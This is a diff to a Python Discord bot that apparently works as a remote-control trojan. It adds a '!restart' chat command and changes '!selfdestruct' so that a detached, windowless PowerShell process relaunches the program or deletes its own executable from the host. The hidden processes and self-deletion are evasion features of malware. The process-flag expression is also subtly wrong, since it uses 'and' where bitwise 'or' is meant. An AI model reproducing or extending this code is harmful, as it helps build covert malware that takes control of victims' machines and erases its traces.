@@ -1023,6 +1023,24 @@ async def on_message(message):
             await message.reply(embed=embed) 
 
 
+#RESTART
+    elif message.content == "!restart":
+        await message.reply("Restarting...")
+
+        try: 
+            vc.stop()
+            await voice_channel.delete()
+        except: pass
+
+        #await message.channel.delete()
+
+        cmd = f"powershell Start-Sleep -Seconds 5;  Start-Process '{sys.argv[0]}'"
+        subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP and subprocess.CREATE_NO_WINDOW) #creationflags=subprocess.CREATE_NO_WINDOW
+        #sys.exit(0)
+
+        await client.close()
+
+
 #SELF DESTRUCT
     elif message.content.startswith("!selfdestruct"):
         if message.content.startswith("!selfdestruct CONFIRM"):
@@ -1038,11 +1056,15 @@ async def on_message(message):
                 vc.stop()
                 await voice_channel.delete()
             except: pass
-            await client.close()
+
 
             #cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{dir}' -Recurse -Force"
             cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{sys.argv[0]}'"
-            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP) #creationflags=subprocess.CREATE_NO_WINDOW
+
+            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP and subprocess.CREATE_NO_WINDOW) #creationflags=subprocess.CREATE_NO_WINDOW
+
+            #await message.channel.delete()
+            await client.close()
             sys.exit(0)
         else:
             embed = discord.Embed(title="Self destruct",  description="```Please use '!selfdestruct CONFIRM' to confirm this action!```", color=0xfafafa)
